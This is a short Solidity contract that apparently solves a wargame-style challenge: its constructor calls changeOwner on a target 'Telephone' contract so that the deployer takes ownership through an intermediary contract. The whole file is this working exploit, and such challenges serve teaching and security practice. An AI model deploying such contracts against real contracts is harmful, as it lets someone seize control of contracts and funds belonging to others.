// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract AttackTelephone {
    constructor(address _telephone) {
        ITelephone(_telephone).changeOwner(msg.sender);
    }
}
